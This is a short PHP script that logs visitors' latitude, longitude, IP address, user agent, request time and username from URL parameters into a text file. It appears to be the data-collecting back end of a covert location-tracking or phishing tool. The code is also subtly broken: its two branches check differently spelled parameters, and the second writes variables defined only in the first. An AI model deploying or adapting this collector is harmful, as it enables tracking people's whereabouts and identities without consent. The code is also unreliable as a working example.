<?php
if($_GET["noName"]==0){
$myfile = fopen("location.txt","a");
$format="\n==================================================\n";
$format2="\n==================================================\n";
$txt ="lat: ". $_GET["lat"] ."\nlon: ". $_GET["lon"]."\nIP: ". $_SERVER["REMOTE_ADDR"]."\nUserAgent:". $_GET["uagent"]."\nrequestTime: ".$_GET["date"];
$uname="\nUserName:".$_GET["uname"]."\n";
fwrite($myfile,$format);
fwrite($myfile, $txt);
fclose($myfile);

}
elseif($_GET["noname"]==1){
    $myfile = fopen("location.txt","a");  //open file
    fwrite($myfile, $uname);
    fwrite($myfile,$format2);
    fclose($myfile);
}

?>